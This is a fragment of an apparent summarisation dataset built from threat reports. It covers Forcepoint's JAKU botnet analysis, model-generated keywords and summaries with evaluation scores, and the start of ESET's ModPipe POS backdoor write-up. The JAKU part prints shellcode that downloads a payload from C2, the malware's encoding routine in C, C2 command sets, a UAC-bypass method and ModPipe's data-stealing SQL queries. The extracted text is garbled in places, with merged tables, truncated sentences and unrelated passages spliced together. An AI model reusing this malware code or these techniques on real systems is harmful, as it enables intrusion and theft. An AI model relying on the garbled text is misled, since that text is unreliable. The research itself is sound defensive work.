boundary=--HC-MPFD-BOUNDARY Content-Length: 320 User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36 Proxy-Connection: Keep-Alive Pragma: no-cache ----HC-MPFD-BOUNDARY Content-Disposition: form-data; name=\"id\" ----HC-MPFD-BOUNDARY Content-Disposition: form-data; name=\"userfile\"; filename=\"AAwp2ySc.ifo\" Content-Type: application/octet -stream s\ufffds\ufffdu\ufffdR\ufffd\ufffdt\ufffd\ufffdw \ufffd\ufffd\ufffds \ufffdR054644\ufffd\ufffd\ufffd\ufffdR\ufffd5246\ufffd\ufffd4415\ufffd\ufffdr\ufffd\ufffd\ufffd\ufffd\ufffdK\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd?\ufffd\ufffd\ufffd ----HC-MPFD-BOUNDARY--The \"id\" value \"AAwp2ySc\" is a base64 encoded version of the MAC address's hexadecimal values for the adapter that is determined to be the primary one, which in this instance was \u201c00 0c 29 db 24 9c\u201d. The gzip compressed data, in plaintext looks like this example:CNAME: MICROSOFT DNAME: NoneNext, the malware injects shellcode into explorer.exe to contact its C2 with a GET request, which seems to expect another encrypted malware to be returned. The following shows parts of the shellcode (dumped from Ollydbg), which shows this C2 server communication. The comments indicate what the values of certain registers and addresses are in real time. Again, the MAC address identifier can be seen in the following 0101A667 8D86 70050000 LEA EAX,DWORD PTR DS:[ESI+0x570] ; URLDownloadToFileA 0101A66D 50 PUSH EAX 0101A66E 53 PUSH EBX ; HMODULE = urlmon.dll 0101A66F FF56 08 CALL DWORD PTR DS:[ESI+0x8] ; kernel32.GetProcAddress 0101A672 8BD8 MOV EBX,EAX 0101A674 85DB TEST EBX,EBX 0101A676 75 05 JNZ SHORT explorer.0101A67D 0101A678 6A 64 PUSH 0x64 0101A67A FF56 0C CALL DWORD PTR DS:[ESI+0xC] ; kernel32.ExitProcess 0101A67D 8D86 6C040000 LEA EAX,DWORD PTR DS:[ESI+0x46C] ; C:\\DOCUME~1\\user\\LOCALS~1\\Temp\\tmp2F.tmp 0101A683 6A 00 PUSH 0x0 0101A685 6A 00 PUSH 0x0 0101A687 50 PUSH EAX 0101A689 6A 00 PUSH 0x0 0101A68B FFD3 CALL EBX ; URLDownloadToFileATLP-WHITE | 28The code continues on to delete a Zone.Identifier ADS for msvcrt.dll (msvcrt.dll:Zone.Identifier). The purpose of this part of the code is unclear, because msvcrt.dll does not seem to be overwritten by the malware and should not contain a Zone.Identifier record that prevents its usage in any way.Malware Configuration. The malware also contains a configuration of sorts. Some of the parts include:S[32]:inner_UniqID=4C2830A17D224f20ADA23901BD61DDE4 B:inner_Escl=1 S[260]Exe Location=C:\\Program Files\\Common Files\\Services\\CompSvc.exeEach field is preceded by the length and type of the value associated with it. For example: S[32] means that the value contains a string of 32 characters.\uf0b7 The inner_UniqID value seems to be a static value, probably used as a campaign identifier.\uf0b7 The inner_Escl value is a Boolean, indicating whether escalated permissions are available. If not, thenthe malware drops a DLL payload into the Windows sysprep folder under the name cryptbase.dll. It then launches sysprep.exe, which will run with administrative permissions and load up cryptbase.dll from the current folder rather than the system folder. This technique is a commonly used means of bypassing Windows User Account Control (UAC).\uf0b7 The Exe Location value is the current location of the malware.TLP-WHITE | 29MALWARE STAGE 2 \u2013 C3PRO-RACCOONC3PRO-RACCOON is another one of the second stage components (fake PNG) that is hosted on a C2 server with the small amount of targeted victims. This C2 data set is suspected of being a targeted set of victims and is referred to within the JAKU analysis as RACCOON.The C3PRO- RACCOON malware initially communicates with a specific C2 server over DNS. Kaspersky have already blogged about this same malware family when it was hosted on the KCNA North Korean news site in C3PRO-RACCOON Behaviour. This malware sample is another self-extractor, which drops the usual start.bat and end.bat files along with the Trojan component and a utility to add a new Windows task:start.bat end.bat drmanidd32.dll (C3PRO-RACCOON trojan) SetTaskPathDl.exe (C# utility to add a new Windows task) Microsoft.Win32.TaskScheduler.dll (legitimate file used by SetTaskPathDl.exe for task scheduler stuff)The file start.bat is executed which results in SetTaskPathDl.exe being invoked with the following arguments:%temp%\\SetTaskPathDl.exe drmanidd32.dll Adobe Update SecuUpdates.dllThis results in drmanidd32.dll being moved to %appdata%\\Adobe\\Update\\SecuUpdates.dll and a Windows task created to execute the following command upon user logon:C:\\WINDOWS\\system32\\rundll32.exe %appdata%\\Adobe\\Update\\SecuUpdates.dll,start nowOnce executed, SecuUpdates.dll generates DNS traffic, which is the C2 channel communication:The malware resolves a specific C2 DNS name and uses the returned IP as a DNS server for resolving the CNAME of pWrpqMoqqipJiiwGBgaoxueIyMaG56g.e.q, which results in a resolution of LS4.com at IP \"+MICROSOFT_000C29DB249C\" which is a '+' followed by the current computer name, \"_\" and then the MAC address of the primary network adapter.TLP-WHITE | 30Here is the encryption routine in assembly: loop:mov al, buffer[ecx] ; buffer contains string to encrypt (i.e. \"+MICROSOFT_000C29DB249C\")add al, 3 ; Add a value of 3 to the current 8-bit char valuemovzx eax, al ; Clear eax, replace with lower 8-bit val (this is pointless, poor coding)xor eax, 3 ; XOR 32-bit value of eax (which is just 8-bit al, effectively) by 3mov edx, eax ; Save eax in edxshr edx, 3 ; Shift edx right by 3 bitsshl al, 5 ; Shift 8-bit eax value left by 5 bitsor dl, al ; OR 8-bit edx against 8-bit eaxmov buffer[ecx], dl ; Copy new value (stored in dl) into current index of bufferinc ecx ; Increase buffer indexcmp ecx, edi ; Check if we're done yetjl short loopThis routine is poorly coded, as 32-bit values are not required. Alternatively, the author introduced an error in the left shift. Regardless, once corrected and optimised, the routine look like this:loop:mov al, buffer[ecx] ; buffer contains string to encrypt (i.e. \"+MICROSOFT_000C29DB249C\")add al, 3 ; Add a value of 3 to the current char valuexor al, 3 ; XOR char value by 3mov dl, al ; Copy char value (into dl)shr dl, 3 ; Shift char value right by 3 bits (truncate)shl al, 5 ; Shift the same char value (in al) left by 5 bits (truncate)or dl, al ; OR both char valuesmov buffer[ecx], dl ; Copy new value (stored in dl) into current index of bufferinc ecx ; Increase buffer indexcmp ecx, edi ; Check if we're done yetjl short loopOr the same, more complete routine in C:void encode(char *buffer){for (int i = 0; i < strlen(buffer); i++){unsigned char a = buffer[i];unsigned char b;a += 3;a ^= 3;b = a;b >>= 3;a <<= 5;b |= a;buffer[i] = b;}}TLP-WHITE | 31DNS Command Channel. The DNS requests containing the encrypted system name and MAC address happen regularly (~2 minutes), with the IP of LS4.com changing each time. The malware translates LS4.com into LS4=, base64 decodes it and then decrypts it using the reverse of the algorithm above. The result of this is the string \"go\", and the malware also understands the following commands:COMMAND PURPOSENOTESgo dldudecmcuexThis just means \"OK - no action to take\" Change wait/sleep time between DNS C2 attempts Takes 1 parameter (sleep time inTakes 0 parametersNot implemented by authorStart UDT based C2 module Start secondary C2 module Inject a DLL into a process via remote thread in explorer.exe Unload DLL from current process via remote thread in explorer.exe Securely delete file (write/read 4 times, rename 900 times, truncate to 0 size, then delete) Execute command-line utility (%COMSPEC%) with parameter and send results to C2 over DNS Send computer information to C2 over DNSExecute command via WinExec but do not send back the results to C2 serverminutes) This routine does nothing and appears to be a placeholder for a future routine Takes 2 parameters (port, server) Takes 2 parameters (port, server) Takes 2 parameters (DLL filename, process name without .exe) Takes 2 parameters (first param must be 0, second is DLL filename) Takes 1 parameter (file to delete)Takes 1 parameter (command to execute) Takes 2 parameters (port - ignored, server) Takes 1 parameter (command to execute)A \"parameter\" here is a part of the CNAME separated by a \".\". For example, \"LS4.test.com\" would be the command, \"go\" with 1 parameter \"test\" The \"secondary\" C2 module receives commands over TCP and a custom protocol. The data structures are defined below:// This is the client hello packet structure (actually not really a structure, just a 4 byte value)typedef struct clienthello_s{uint32 client_magic; // Must be 0xDF1B697A} clienthello_t;// This is the encryption key structure for packet encryption & decryptiontypedef struct keyheader_s{byte subkey;byte xorkey;byte rolkey;byte _align; // Unused, just here for alignment} keyheader_t;// This is the full structure for anything received from the servertypedef struct servercmd_s{uint32 server_magic; // Must be 0xA37CE092keyheader_t hdr; // Encryption keysTLP-WHITE | 32long cmdlen; // Length of command buffer (encrypted)char cmdbuf[512]; // Command buffer (encrypted)} servercmd_t;// This is used by the file upload & download routinestypedef struct filetransfer_s{long filesize; // Size of file (encrypted)byte filedata[]; // File contents (encrypted)} filetransfer_t;The \"UDT\" C2 module receives commands over UDP and the UDT library protocol. The data structures used by the malware are similar to the ones above, but without magic values or encryption keys. Instead, the encryption keys are static. The UDT C2 module only supports a subset of the commands that the secondary C2 module does.The command set supported by the secondary and UDT C2 modules is the same as in Kaspersky\u2019s analysis of the KCNA malware. However, our analysis of the KCNA malware and C3PRO-RACCOON revealed some additional functionality and small differences in what Kaspersky reported.The full list of commands used by the secondary and UDT modules can be seen in the table below:COMMAND PURPOSE_get_got_cmd_exe_quit_inf_dll_put_del_dir_prc_cap_dluEncrypt and send specified fileEncrypt and send specified file and then securely delete it from diskExecute command-line utility (%COMSPEC%) with parameter and send results to C2Execute parameter via WinExec APIExit the C2 threadGrab system information, save it to file, encrypt it, send it to C2 and then securely delete it. \uf0b7 Operating system version \uf0b7 All connected drives and properties \uf0b7 Network adapter properties \uf0b7 Disk free space \uf0b7 All installed programsInject a DLL into a process via remote thread in explorer.exeReceive, decrypt, and write a buffer to disk at a specified file locationSecurely delete specified file using John Underhill's \"Secure File Shredder\" codeSend a directory listing for path specifiedSend a full running process list to C2Take a screenshot, save it to file, encrypt it, send it to C2 and then securely delete itUnload DLL from current process only via remote thread in explorer.exeTLP-WHITE | 33OBSERVATIONS ON C3PRO-RACCOONThe ability for malware to concurrently support three separate, custom built C2 channels is more advanced than the majority of malware currently observed in the global threat landscape. This offers insight into the amount of effort the malware author and actor(s) have expended to ensure that the malware is stealthy and can remain in contact with its C2s, despite the network environment it may be running within.UDT Library. The malware uses an open source library called UDT3 for one of its C2 channels. UDT provides much of the benefits of TCP but retains higher data transfer speeds over UDP. The authors likely chose the library in order to provide the flexibility of being able to securely use UDP for C2 communication, as well as being stealthy at the same time.Secure Delete. The file deletion routine has been taken from publicly available secure erasure code. This code was originally written by John Underhill and called \u201cSecure File Shredder\u201d4. The routine used in the malware even contains the same mistake as John Underhill made, where he renames the file 780 times (30 * 26) instead of the intended 30. The only difference is that the file truncation is only performed once in the malware, rather than 10 times, as in Underhill's code. The purpose of this code is to prevent advanced forensics techniques from being able to recover the deleted files.Unfinished Code. The 'du' and 'dlu' commands are interesting because they only support unloading a module from the current process, but by creating a remote thread in a new explorer.exe. This makes little sense because it would be a lot simpler and more effective to just unload the module in the current process. This is likely to be an unfinished or abandoned routine that is currently not used by the actor. The older version of this malware that Kaspersky analysed did not have any implementation for 'dlu', and the 'dll' routine did not create a new thread in an explorer.exe process to do this work, but instead did it from its own process.Spoofed File Dates. When a file is sent to the infected machine via the \"_put\" command and written to disk, the file access times are modified to be the same as gdi32.dll's from the system directory. This makes the file less suspicious and can also prevent some forensic time-lining.Under Development. The older version of this malware that Kaspersky analysed was compiled using Microsoft Visual Studio 6.0, whereas this version has been compiled with Microsoft Visual Studio 10.0. The malware is clearly being actively developed and the developers' environment(s) are being improved.3 url 4 url | 34WHO IS SAPHARUS?SAPHARUS-PC is the name of a Windows computer which appears over 1,800 times in one of the JAKU Datasets (referred to as the SAPHARUS data set for this reason). From a research point of view, this significant anomaly clearly needed investigation.SAPHARUS Timeline. The number of entries is the database is constantly changing. While the total number of entries appears to grow, due to more victims being infected, the number of SAPHARUS entries is decreasing:DATEVICTIM COUNTSAPHARUS-PC COUNT2015-10-04 2015-10-26 2015-11-15 2015-12-105765 1831The Real SAPHARUS. Within the dataset there appear one is 'real' SAPHARUS-PC (UID: D1336E59-0FB3- because of the system information is complete and is not duplicated elsewhere. Whereas, the SAPHARUS-PC duplicates all have identical system information.Hypothesis #1 - Overwrites. Real entries were overwritten in error with the SAPHARUS data. A number of facts support this hypotheses: the fake SAPAHRUS data is clearly corrupted and is missing the task list and recent files, part of which could have resulted in some sort of parsing error or when dumping it in the DB. The ASN's and IP's of these entries seem to indicate that they are real victims. However, it is impossible to prove that it wasn't done intentionally. (Likelihood: High)Hypothesis #2 - Additions. SAPHARUS entries were added either due to an error or intentionally. This seems less likely as SAPHARUS-PC entries reuse some of the IPs already in the database. Furthermore, adding SAPHARUS entries intentionally would serve very little purpose.There is evidence that at least one SAPHARUS-PC is bogus:SAPHARUS at Forcepoint. One of the hosts with the name SAPHARUS-PC has an external IP address recorded in the dataset, which is in reality an IP address owned and operated by Forcepoint. During the analysis of JAKU, the Forcepoint Special Investigation team operated a honeypot machine which had an external IP address identical to the SAPHARUS-PC public IP address.Diversity of Addresses. The SAPHARUS-PC external IP addresses are from a large and diverse number of ASNs. These IP addresses and ASNs appear to correlate with the ASNs of other victims.Truncated System Information. SAPHARUS-PC entries have truncated system information (INFO); i.e. no task list and no recent files.It is believed that the SAPHARUS-PC entries are duplicated information from other victim data. Why this is the case is unclear. Possibilities include programming errors in the C2 software (possible), or the use of SAPHARUS-PC as a 'flag' while administering the C2 data sets (unlikely).For analysis purposes, the SAPHARUS-PC entries were not included in detailed analysis such as correlation of victims within and across C2 servers.TLP-WHITE | 35C2 TELEMETRY DATABASESSQLite Databases. All JAKU C2 servers identified have viewable directories via the local web server. From a web browser, it is possible to view the content of a directory named /img:Index of /imgIcon Name Last modified Size Description____________________________________________________________________________________________________________________________[DIR] Parent Directory[IMG] near.jpg 09-Dec-2015 19:59 451M____________________________________________________________________________________________________________________________Apache/2.2.21 (Unix) DAV/2 mod_ssl/2.2.21 OpenSSL/1.0.0c PHP/5.3.8 mod_apreq2-20090110/2.7.1 mod_perl/2.0.5Perl/v5.10.1 Server at pic3.mooo.com Port 80Near.jpg. The file called near.jpg is not an image file. When examined, the file is found to be a SQLite2 format database:$ file near.jpgnear.jpg: SQLite 2.x databaseThis database contains details of the malware/botnet victim hosts. It details the network information, dates and times the malware first 'called home', the last call-home time, the last updated time and a history of the malware beaconing to the C2 server:$ sqlite near.jpg .schemaCREATE TABLE child (uid TEXT PRIMARY KEY, version REAL, pip TEXT, info TEXT, infouptime INTEGER,iplist TEXT, instime INTEGER,lasttime INTEGER, downfile TEXT, downver REAL);CREATE TABLE dist2 (id INTEGER PRIMARY KEY, pubdownfile TEXT, pubdownver REAL, pubdowncnt INTEGER,pridownfile TEXT, pridownver REAL, pridowncnt INTEGER);CREATE TABLE history (id INTEGER PRIMARY KEY, uid TEXT, ctime INTEGER);CREATE TABLE tvdist (id INTEGER PRIMARY KEY, tvdownfile TEXT, tvdownver REAL, tvdowncnt INTEGER);CREATE INDEX idx_instime ON child(instime);CREATE INDEX idx_lasttime ON child(lasttime);CREATE INDEX idx_version ON child(version);TLP-WHITE | 36HISTORY Table. The history table contains a list of all beacons set by the malware on the victim machine to the C2 server:COLUMN DESCRIPTIONUIDA unique identifier of the victim. This matches the UID in the CHILD tableCTIMEThe data/time of a beacon made from the victim machine to the C2 server. As with all the data/times in the SQLite database, the format is in \"UNIX Epoch\" format.Example query of HISTORY table:$ sqlite -column -header near.jpg \"SELECT * FROM HISTORY LIMIT 5;\"id uid ctime---------- -------------------------------------- ----------1 {610313D3-6359-4543-8314-64E1DF6DBF20} 14301864732 {610313D3-6359-4543-8314-64E1DF6DBF20} 14301882423 {12941DFB-6ECD-45CD-B7B2-9C0F8F16DF6F} 14303596484 {66CEAD40-85D9-4AA8-9B59-3DF9E079FA69} 14304438965 {211E31DB-C944-4C66-A91C-7C7BDF7CE5EF} 1430447441$ sqlite -column -header near.jpg 'SELECT STRFTIME(\"%Y-%m-%d %H:%M:%S\",CTIME,\"UNIXEPOCH\") AS\"DATE/TIME\" FROM HISTORY WHERE UID=\"{211E31DB-C944-4C66-A91C-7C7BDF7CE5EF}\"DATE/TIME-------------------2015-05-01 02:30:412015-05-01 06:30:342015-05-01 07:04:072015-05-01 07:30:342015-05-01 08:30:352015-05-01 09:00:352015-05-01 09:30:352015-05-01 10:00:352015-05-01 10:31:552015-05-01 11:01:162015-05-01 11:30:362015-05-01 12:00:352015-05-01 12:30:342015-05-01 13:00:392015-05-01 13:30:342015-05-01 14:00:352015-05-01 14:30:342015-05-04 13:30:402015-05-04 14:00:392015-05-04 14:30:392015-05-04 15:00:38TLP-WHITE | 37CHILD Table. Analysis has shown that the table CHILD is information that relates to victim hosts:COLUMNDESCRIPTIONUIDA unique identifier of the victim. This allows the C2 server to track victims if and when their IP address changes.VERSIONBelieved to be the version of the malware on the victim machine.PIPThe public IP address of the victim. This is updated as and when the victim machines external IP address changes.INFOThe details gathered by the malware from the victim machine (See below).INFOUPTIMEThe date/time that the INFO field was updated in the database. Believed to be the date/time on the C2 throws greater insight on the JAKU campaign, while much of it, sadly, does not. Occasionally, when \u2018pivoting\u2019 off already collected data, strange and unusual things are found; for example, learning that Shokushu is Japanese for tentacle.Unfortunately, time is sometimes not available to allow for the \u201cso what?\u201d questions to be answered fully. One example is the following script which was found at the URL: hxxp://bestshop.minidns.net/test/ccdown/ping.bat. Although dating back to November 2014, it is still noteworthy because of a number of curiosity reasons. One example is: \u201cWhy \u2018ping\u2019 after doing the \u2018traceroute\u2019?\u201dThe remaining reasons are left as an exercise to the reader. However, this is not the Easter-egg you are because we had discovered a number of Star Wars references made by the threat actors within their malware. This included R2D2. Because we had no wish to face any copyright issues, we spelt it as JAKU.However, as we embarked on our investigation we found out more about JAKU. We realised that this thing had reached every corner of the world. As we continued, it began to emerge that this beast had a centre of gravity somewhere in the Gulf of Thailand and a predilection for attacking Japan and South Korea.As an unashamed fan Japanese monster movies, anime, manga and DJ Krush, and with more than a passing interest in Lovecraft\u2019s Cthulhu mythos, it was clear (to me at least) that JAKU should be represented as a tentacle wielding sea monster rising from ocean to grab its next set of victims. This fitted well with our observation of the noticeable amount of pirated anime movies on the victim machines, downloaded from sites \u2018baited\u2019 with malware to catch the next unsuspecting victims.Andy Settle Head of Special Investigations, Forcepoint Security LabsTLP-WHITE | 43REFERENCES\uf0b7 Coding and Security, Glorious Leader's Not-That- Glorious Malwares - Part 2 (Jan 2015), Available from: <url Leaders-Not-That-Glorious-Malwares-Part-2>. [Dec 2015]\uf0b7 Schneier Bruce, DarkHotel (Nov 2014), Availablefrom: <url phisticated_t.html>. [Sep 2015].\uf0b7 CNET, 'Darkhotel' hack targets executives using hotelInternet (Nov 2014), Available from: <url executives-using-hotel-internet/>. [Oct 2015].\uf0b7 FBI, Malware Installed on Travelers' Laptops Through Software Updates on Hotel Internet Connections (Nov 2014), Available from: <url [Oct 2015].\uf0b7 Fluke Networks, DarkHotel: What Hospitality WLAN Operators Should Know (Nov 2014), Available from: <url -what-hospitality-wlan-operators-should-know>. [Oct 2015].\uf0b7IANA Number Resources, <url [April 2015].\uf0b7 Kaspersky, Admin Alert: Kaspersky Lab ReportedTwice as Many Digital Certificates Used to Sign Malware in 2014 (Jan 2015), Available from: <url dmin-Alert-Kaspersky-Lab-Reported-Twice-as-Many- Digital-Certificates-Used-to-Sign-Malware-in-2014>. [Oct 2015].\uf0b7 Kaspersky, DarkHotel's attacks in 2015 (Jul 2015),Available from: <url s-attacks-in-2015/>. [Oct 2015].\uf0b7 Kaspersky, DarkHotel: a spy campaign in luxuryAsian hotels (Nov 2014), Available from: <url [Sep 2015].\uf0b7 Kaspersky, Whitepaper DarkHotel (Nov 21014),Available from:<url 11.pdf>. [Sep 2015].\uf0b7 Kaspersky, Who\u2019s Really Spreading through theBright Star? (Apr 2015), Available from: <url spreading-through-the-bright-star/>. [Dec 2015].\uf0b7 Secure File Shredder (Oct 2008), Available from:<url File-Shredder>. [April 2016].\uf0b7 Sophos, What the FBI didn\u2019t tell us about the hotelmalware threat | Naked Security (May 2012), Available from: <url hotel-malware-threat>. [Dec 2015].\uf0b7 Tamatori fighting an octopus, Available from:<url a_Tamatori_attacked_by_the_octopus.jpg>, [April 2016].\uf0b7 UK CERT, SAWR 044 Extract (Dec 2014), Availablefrom: <url content/uploads/2014/12/C-SAWR-044-Extract.pdf>. [Dec 2015].\uf0b7 Unlicensed Software and Cybersecurity Threats(January 2015), Available from: <url are_en.pdf>. [April 2015].\uf0b7 WIRED, DarkHotel: A Sophisticated New HackingAttack Targets High-Profile Hotel Guests (Nov 2014), Available from: <url [Sep 2015].\uf0b7 UDT: Breaking the Data Transfer Bottleneck (2011),Available from: <url [Dec 2015].\uf0b7LZH - Compression/Decompression using lzh/lzhuff (Jan 2015), Available from: <url >. [Oct 2015].TLP-WHITE | 44 ", "generated_text": "JAKU; detection; detection; a JAKU botnet; several years; attackers; r; command; control; servers; C2 servers; individuals; countries; North Korea; DPRK; Pyongyang; the use; infrastructure; tools; techniques; processes; victims; targeted attacks; the botnet controllers; up to 25,000; victims; a variety; NGOs; individuals; NGOs; academics; academics; government employees; the report; IP addresses; victims; IP addresses; indicators; compromise; compromise; data; The attack; a URL; Google; HTTPS; Detection; Counterfeit; Windows Update; credentials; Authentication; the same attacker; a server; a single target; IOCs; a group; RAT; indicators; malware versions; detection; RAT data; tools; APT; persistence; C2 servers; location; targets; time; addition; the C2 servers; technical analysis; the US; Europe; Japan; Russia; SAR; TA; C2 servers; a targeted operation; a few; the network; analysis; details; the botnet campaign; German; countries", "ref_text": "<START-1>The document analyzes an ongoing botnet campaign called JAKU investigated by Forcepoint. JAKU involves both indiscriminate targeting of thousands of victims as well as precision targeting of specific individuals related to North Korea. Technical analysis reveals a multi-stage infection process involving poisoned BitTorrent files and fake image files containing malware. The malware communicates with command and control (C&C) servers via encrypted protocols. It gathers system information and can execute commands from the attacker. The C&C servers store victim data in SQLite databases. Analysis of the data shows victims are predominantly in South Korea, Japan, and China. Many appear to be running counterfeit Windows installs and pirated software. The malware uses resilient, custom communication channels including DNS, TCP, UDP, and UDT protocols. It employs evasion techniques like process injection and deletion to avoid detection. The malware continues to be actively developed. The report documents the infection process, capabilities, infrastructure, victimology, and attribution clues uncovered during the JAKU investigation. It aims to provide insights into the inner workings of botnets and modern cybercrime campaigns. <END-1>", "t5/keyword/hint_hit_precision": 0.2, "t5/word/hint_hit_recall": 0.12209302325581395, "gpt3/lexical/rouge_rouge1": 0.36363636363636365, "gpt3/lexical/rouge_rouge2": 0.04807692307692307, "gpt3/lexical/rouge_rougeL": 0.18181818181818182, "gpt3/lexical/rouge_rougeLsum": 0.18181818181818182, "gpt3_generated_text": ["The article discusses the investigation, surveillance, and analysis of the JAKU botnet campaign by the Forcepoint Special Investigations team. The campaign reveals the re-use of Infrastructure, Tools, Techniques, and Processes (TTPs) by organised crime in operating botnets. The JAKU campaign herds victims into separate groupings, with some being indiscriminate and others highly targeted. The precision targeting and tracking of individuals from various nationalities, including members of NGOs, engineering companies, academics, scientists, and government employees, is identified. The common theme among these individuals is North Korea (DPRK) and Pyongyang. The technical details of the 'RED-RACOON' operation targeting these individuals are included in the report. The study highlights the consequences faced by Internet users who disregard copyrights and digital rights, leading to end-point security vulnerabilities and potential misuse of their machines by adversaries. Botnets serve as resilient and pervasive attack infrastructures deployed by major threat actors, including organised crime-sponsored attackers and rogue states. The detection and tracking of up to 25,000 victims, a variety of NGOs, academics, and government employees, are discussed. The report also covers IP addresses, indicators of compromise, data exfiltration, counterfeit Windows Update, authentication credentials, C2 servers, malware versions, APT tools, persistence, and the geographical locations of targets. The technical analysis includes victims from the US, Europe, Japan, Russia, and SAR. The targeted operation on a few individuals and the network analysis details of the botnet campaign are outlined, along with the countries involved in the campaign."]}, {"split_name": "val", "sample_id": "val_124", "prompt_text": "Extract the keywords: 11/13/2020Hungry for data, ModPipe backdoor hits POS software used in hospitality sector | WeLiveSecurityHungry for data, ModPipe backdoor hits POS software used in hospitality sectorwelivesecurity.com/2020/11/12/hungry-data-modpipe-backdoor-hits-pos-software-hospitality-sectorNovember 12, 2020Backdoor authors show deep knowledge of the targeted POS software, decrypting database passwords from Windows registry valuesMartin Smol\u00e1r 12 Nov 2020 - 11:30AMESET researchers have discovered ModPipe, a modular backdoor that gives its operators access to sensitive information stored in devices running ORACLE MICROS Restaurant Enterprise Series (RES) 3700 POS \u2013 a management software suite used by hundreds of thousands of bars, restaurants, hotels and other hospitality establishments worldwide.What makes the backdoor distinctive are its downloadable modules and their capabilities. One of them \u2013 named GetMicInfo \u2013 contains an algorithm designed to gather database passwords by decrypting them from Windows registry values. This shows that the backdoor\u2019s authors have deep knowledge of the targeted software and opted for this sophisticated method instead of collecting the data via a simpler yet \u201clouder\u201d approach, such as keylogging.Exfiltrated credentials allow ModPipe\u2019s operators access to database contents, including various definitions and configuration, status tables and information about POS transactions.However, based on the documentation of RES 3700 POS, the attackers should not be able to access some of the most sensitive information \u2013 such as credit card numbers and expiration dates \u2013 which is protected by encryption. The only customer data stored in the clear and thus available to the attackers should be cardholder names.url for data, ModPipe backdoor hits POS software used in hospitality sector | WeLiveSecurityThis would limit the amount of valuable information viable for further sale or misuse, making the full \u201cbusiness model\u201d behind the operation unclear. One possible explanation is that another downloadable module exists that allows the malware operators to decrypt the more sensitive data in the user\u2019s database.According to the documentation, to achieve this the attackers would have to reverse engineer the generation process of the \u201csite-specific passphrase\u201d, which is used to derive the encryption key for sensitive data. This process would then have to be implemented into the module and \u2013 due to use of the Windows Data Protection API (DPAPI) \u2013 executed directly on the victim\u2019s machine. Another remaining unknown is ModPipe\u2019s distribution method. The majority of the identified targets were from the United States, with indications that they were in the restaurant and hospitality sectors \u2013 the primary customers of RES 3700 POS.ModPipe architectureOur analysis shows that ModPipe uses modular architecture consisting of basic components and downloadable modules (for a better overview see Figure 1):1. initial dropper \u2013 contains both 32-bit and 64-bit binaries of the next stage \u2013 thepersistent loader \u2013 and installs the appropriate version to the compromised machine.2. persistent loader \u2013 unpacks and loads the next stage of the malware, namely themain module.3. main module \u2013 performs the main functionality of the malware. It creates a pipeused for communication with other malicious modules, un/installs these modules and serves as a dispatcher that handles communication between the modules and attacker\u2019s C&C server.4. networking module \u2013 module used for communication with C&C. 5. downloadable modules \u2013 components adding specific functionality to thebackdoor, such as the ability to steal database passwords and configuration information, scan specific IP addresses or acquire a list of the running processes and their loaded modules.url for data, ModPipe backdoor hits POS software used in hospitality sector | WeLiveSecurityFigure 1. Overview of ModPipe backdoor architectureurl for data, ModPipe backdoor hits POS software used in hospitality sector | WeLiveSecurityDownloadable modulesProbably the most intriguing parts of ModPipe are its downloadable modules. We\u2019ve been aware of their existence since the end of 2019, when we first found and analyzed its \u201cbasic\u201d components.In April 2020, after a couple of months of hunting, we found three of these modules in the wild. The list of all downloadable modules we found and analyzed, and their IDs \u2013 represented by a 16-bit unsigned value \u2013 are available in Table 1. Our research also suggests that the operators use at least four other downloadable modules, whose functionality remains completely unknown to us for now.It\u2019s worth mentioning that some of these modules can create a named pipe with a GUID- formatted name derived from the module\u2019s ID. Other modules can use this pipe to send commands to the module that created it.Table 1. Downloadable modulesModule ID NameDescription0xA0C0GetMicInfo Steals database passwords, data and various settings0x2000ModScanPerforms scan on the specified IP addresses-0xA0000xA0400xA7400xA080ProcListGets list of the running processes and their loaded modulesunknownunknownunknownunknown----Downloadable module: GetMicInfoGetMicInfo is a downloadable component that targets data related to the MICROS POS including passwords tied to two database usernames predefined by the manufacturer: dba and micros (see Figure 2). This information is encrypted and stored in DataS5 (for dba) and DataS6 (for micros) registry values within one of the following registry keys:HKLM\\Software\\Micros\\UserData or HKLM\\Software\\WOW6432Node\\Micros\\UserData if run in Windows 32-bit on Windows 64-bit (WOW64) subsystemurl for data, ModPipe backdoor hits POS software used in hospitality sector | WeLiveSecurityFigure 2. Hex-Rays decompiled code of the function stealing database passwordsThe GetMicInfo module can intercept and decrypt these database passwords, using a specifically designed algorithm. So as not to aid other malicious actors, we won\u2019t be disclosing the inner workings of the algorithm. Since the decryption mechanism wasn\u2019t publicly available, there are at least three possible scenarios of how the attackers could have created the algorithm:The most probable option is that the attackers acquired and reverse engineered the implementation of the ORACLE MICROS RES 3700 POS and the libraries responsible for encryption and decryption of the database passwords. The attackers could have gained the information describing the implementation of the encryption and decryption mechanism from a 2016 data breach described in a blogpost by Brian Krebs. The malware operators could have bought the code from an underground market.Our analysis shows that in cases where the GetMicInfo module decrypts the password for the dba username, it will also try to acquire the path to the SQL Anywhere API library from the environment variable \u201cSQLANY_API_DLL\u201d and load it if it\u2019s available.If the environment variable does not exist, the module tries to load the library using its name dbcapi.dll. This library is a part of Sybase SQL Anywhere, which is used by RES 3700 POS.If one of these approaches is successful, GetMicInfo attempts to connect to the database using the following connection string:url for data, ModPipe backdoor hits POS software used in hospitality sector | WeLiveSecurityDBN=micros;UID=dba;ENG=sql%PCNAME%;PWD=%decrypted_DataS5%%PCNAME% represents the computer name retrieved via the GetComputerName API and %decrypted_DataS5% stands for the decrypted dba user password.After establishing a connection, GetMicInfo tries to execute the following SQL queries and report the results to the main module, using a pipe message with ID 0x10000013 (see Table 3 for a full list of pipe messages and their IDs):123456789SELECT lan_node_seq,obj_num,name,lan_addr,ob_diskless,type,ip_addr,ip_netmask FROM micros.lan_node_defSELECT dvc_tbl_seq,obj_num,name,type,com_port_seq,com_port,baud_rate,num_- data_bits,num_stop_bits,parity_type,filename FROM micros.dev_defSELECT tmed_seq,obj_num,name,type,ca_driver,edc_driver FROM micros.tmed_defSELECT * FROM micros.caedc_driver_defSELECT * FROM micros.interface_defQueried data contain various MICROS RES 3700 POS system definitions and configurations (see Figure 3). Other information stolen by the module includes the version of the MICROS POS and information about specific registry keys most likely related to various credit card services configurations.url for data, ModPipe backdoor hits POS software used in hospitality sector | WeLiveSecurityFigure 3. Hex-Rays decompiled code of the function that steals database dataThe GetMicInfo module is injected into one of the processes specified by the C&C in the install command (0x0C). Based on our findings, it is typically associated with one of the following legitimate processes:MDSHTTPService.exe (MICROS MDS HTTP Service) CALSrv.exe (MICROS CAL Service \u2013 Client Application Loader server) explorer.exeWe can 